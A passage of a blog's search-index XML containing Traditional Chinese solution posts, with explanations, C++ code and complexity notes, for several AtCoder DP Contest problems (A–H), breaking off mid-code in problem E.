<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Atcoder DP Contest pC</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pC/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pC"><a href="#Atcoder-DP-Contest-pC" class="headerlink" title="Atcoder DP Contest pC"></a>Atcoder DP Contest pC</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_c" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_c</a><br>每天都有三種活動可以選擇，且有各自價值<br>本次選擇的活動與上次選擇的不能相同，求第 $n$ 天的最大價值總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於點 $1$ 到點 $n-1$ ，每個點都只能選兩種狀態，取其最大值即可<br>定義 $DP[i][j]$ 表示第 $i$ 天選擇第 $j$ 種活動時的最大價值總和<br>則有轉移式 $DP[i][j] = max(DP[i][s], DP[i-1][t])+arr[i][j],\ s \neq j,\ t\neq j,\ s\neq t$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,now,dp[MaxN][<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">3</span> ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;now;</span><br><span class="line">				dp[i][j]=max(dp[i<span class="number">-1</span>][(j+<span class="number">1</span>)%<span class="number">3</span>], dp[i<span class="number">-1</span>][((j+<span class="number">2</span>)%<span class="number">3</span>)]) + now;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			ans=max(ans, dp[n][i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $3n$ 種狀態，每種狀態轉移複雜度為 $O(2)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pG</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pG/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pG"><a href="#Atcoder-DP-Contest-pG" class="headerlink" title="Atcoder DP Contest pG"></a>Atcoder DP Contest pG</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_g" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_g</a><br>給一張有向無環圖$G$，求最長路徑大小</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接DFS每個點是從哪些點轉移過來<br>將答案直接儲存在點上，當已經有答案時直接回傳，就跟DP的概念一樣<br>定義 $DP[i]$ 表示點 $i$ 為終點時的最長路徑<br>則有轉移式 $DP[i] = max(DP[k]+1)$，其中 $k$ 表示所有走向點 $i$ 的點</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dot</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> val=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; from;</span><br><span class="line">&#125;dots[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dots[px].from.empty())</span><br><span class="line">		<span class="keyword">return</span> dots[px].val=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(dots[px].val)</span><br><span class="line">		<span class="keyword">return</span> dots[px].val;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: dots[px].from)&#123;</span><br><span class="line">		res=max(res,dfs(i));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dots[px].val=res+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,a,b ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">			dots[b].from.push_back(a);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			ans=max(ans,dfs(i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS過程會遍歷每個點和邊，且都只會遍歷一次，總複雜度 $O(N+M)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Longest Path</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pF</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pF/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pF"><a href="#Atcoder-DP-Contest-pF" class="headerlink" title="Atcoder DP Contest pF"></a>Atcoder DP Contest pF</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_f" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_f</a><br>給兩個字串，問兩字串的LCS，並輸出最大的LCS</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>把兩個字串拆成:</p>
<blockquote>
<p>s = sub1 + e1<br>t = sub2 + e2</p>
</blockquote>
<p>另$LCS(i,j)$ 表示 $s[0<del>i]$ 和 $t[0</del>j]$ 的LCS長度<br>分成四種情況討論</p>
<ol>
<li>LCS包含 $e1$ ，不含 $e2$<br> $LCS(s,t) = LCS(s,sub2)$</li>
<li>LCS包含 $e1$ ，包含 $e2$<br> $LCS(s,t) = LCS(sub1,sub2)+1$</li>
<li>LCS不含 $e1$ ，不含 $e2$<br> $LCS(s,t) = LCS(sub1,sub2)$</li>
<li>LCS不含 $e1$ ，包含 $e2$<br> $LCS(s,t) = LCS(sub1,t)$</li>
</ol>
<p>總的來說，定義 $DP[i][j]$ 表示$LCS(i,j)$的長度<br>則有轉移式<br>$DP[i][j] = DP[i-1][j-1]+1\ ,s[i]=t[j]$<br>$DP[i][j] = max(DP[i-1][j], DP[i],[j-1])\ ,s[i] \neq t[j]$<br>且已知<br>$DP[i][0] = 0, DP[0][j] = 0$</p>
<p>這邊能獲得的僅僅是LCS長度，但題目所求的是字串<br>可以另外開一個陣列紀錄他是從哪裡轉移過來，最後遞迴輸出結果即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s,t;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">3005</span>][<span class="number">3005</span>],from[<span class="number">3005</span>][<span class="number">3005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i==<span class="number">0</span> || j==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(from[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">		print_LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;s[i<span class="number">-1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(from[i][j] == <span class="number">1</span>)</span><br><span class="line">		print_LCS(i<span class="number">-1</span>,j);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		print_LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;t)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3005</span> ; i++)&#123;</span><br><span class="line">			dp[i][<span class="number">0</span>] = dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=t.size() ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i<span class="number">-1</span>] == t[j<span class="number">-1</span>])&#123;</span><br><span class="line">					dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">					from[i][j]=<span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">if</span>(dp[i<span class="number">-1</span>][j] &gt; dp[i][j<span class="number">-1</span>])</span><br><span class="line">						from[i][j]=<span class="number">1</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						from[i][j]=<span class="number">2</span>;</span><br><span class="line">					dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		print_LCS(s.size(),t.size());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $len(s)*len(t)$ 種狀態，每種狀態轉移時間複雜度為 $O(1)$<br>DP複雜度為 $O(len(s)*len(t))$<br>輸出複雜度大約為 $O(len(s)+len(t))$<br>總複雜度 $O(len(s)*len(t))$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>LCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pA</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pA/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pA"><a href="#Atcoder-DP-Contest-pA" class="headerlink" title="Atcoder DP Contest pA"></a>Atcoder DP Contest pA</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_a" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_a</a><br>跳到第 $i$ 格的方法有兩種</p>
<ul>
<li>從 $i-1$ 格跳，花費 $\mid arr[i]-arr[i-1] \mid$</li>
<li>從 $i-2$ 格跳，花費 $\mid arr[i]-arr[i-2] \mid$</li>
</ul>
<p>求跳到第 $n$ 格的最小花費</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個格子 $i$ 只能從 $i-1$ 和 $i-2$ 轉移過來，因此只需要判斷從誰走過來最小就能保證會是最佳解<br>定義 $DP[i]$ 表示第 $i$ 格的最小花費<br>則有轉移式 $DP[i] = min(DP[i-1] + \mid arr[i]-arr[i-1] \mid,\  DP[i-2] + \mid arr[i]-arr[i-2] \mid)$<br>且 $DP[0] = 0, DP[1] = abs(arr[1]-arr[0])$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[MaxN],dp[MaxN];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		dp[<span class="number">1</span>]=<span class="built_in">abs</span>(arr[<span class="number">0</span>]-arr[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i]=min(dp[i<span class="number">-1</span>]+<span class="built_in">abs</span>(arr[i]-arr[i<span class="number">-1</span>]), dp[i<span class="number">-2</span>]+<span class="built_in">abs</span>(arr[i]-arr[i<span class="number">-2</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[n<span class="number">-1</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態的轉移複雜度為 $O(1)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pH</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pH/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pH"><a href="#Atcoder-DP-Contest-pH" class="headerlink" title="Atcoder DP Contest pH"></a>Atcoder DP Contest pH</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_h" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_h</a><br>給一張二維圖，圖上有障礙物，問從點 $(1,1)$ 走到點 $(h,w)$ 的方法數模 $10^9+7$ 為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟走樓梯的DP概念相同<br>同一個格子只能從左邊或上面轉移過來，則方法數會是兩者相加<br>定義 $DP[i][j]$ 表示在第 $(i,j)$ 格的方法數<br>則有轉移式 $DP[i][j] = DP[i-1][j] = DP[i][j-1]$<br>且已知 $DP[1][1] = 1$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> h,w;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;h&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;h ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;w ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		dp[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=h ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=w ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(arr[i<span class="number">-1</span>][j<span class="number">-1</span>]==<span class="string">'#'</span>)</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				dp[i][j] += (dp[i][j<span class="number">-1</span>] + dp[i<span class="number">-1</span>][j])%Mod;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[h][w]%Mod&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $hw$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度 $O(hw)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pB</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pB/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pB"><a href="#Atcoder-DP-Contest-pB" class="headerlink" title="Atcoder DP Contest pB"></a>Atcoder DP Contest pB</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_b" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_b</a></p>
<p>對於每個點 $i$ 可以從點 $i-1, i-2, … , i-k$ 轉移<br>而轉移的花費為 $\mid arr[i]-arr[i-k] \mid$<br>求到點 $n$ 的最小花費</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每種轉移方式求最大值<br>定義 $DP[i]$ 表示點 $i$ 的最小花費<br>則有轉移式 $DP[i] = min(DP[i], DP[i-k] + \mid arr[i]-arr[i-k] \mid)$<br>且 $DP[0] = 0, DP[1]=abs(arr[0]-arr[1])$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,arr[MaxN],dp[MaxN];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			dp[i]=INT_MAX;</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; i-j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=k ; j++)&#123;</span><br><span class="line">				dp[i]=min(dp[i], dp[i-j] + <span class="built_in">abs</span>(arr[i]-arr[i-j]));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[n<span class="number">-1</span>]&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態轉移複雜度為 $O(k)$<br>總複雜度 $O(nk)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pE</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pE/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pE"><a href="#Atcoder-DP-Contest-pE" class="headerlink" title="Atcoder DP Contest pE"></a>Atcoder DP Contest pE</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_e" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_e</a><br>與pD相同，但是重量可以來到 $10^9$<br>問最大價值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為重量太大了，導致無法使用pD的作法<br>但是價值不大，可以從這裡下手<br>將問題倒過來思考，如果知道在某價值下最小的重量總和，那麼只要重量總和小於等於題目要求，那麼該價值的最大值即為解</p>
<p>定義 $DP[i]$ 表示在價值為 $i$ 時的最小重量總和<br>則有轉移式 $DP[i] = min(dp[i], dp[i-value[j]]+cost[j])$<br>且已知 $dp[0] = 0$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">105</span>,MaxV = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,w,cost[MaxN],value[MaxN];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[MaxV];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">int</span> tot_value=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;cost[i]&gt;&gt;value[i];</span><br><span class="line">			tot_value+=value[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=tot_value ; i++)&#123;</span><br><span class="line">			dp[i] = INT_MAX;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=tot_value ; j&gt;=value[i] ; j--)&#123;</span><br><span class="line">				dp[j]=min(dp[j], dp[j-value[i]]+cost[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=tot_value ; i&gt;<span class="number">0</span> ; i--)&#123;</span><br><span 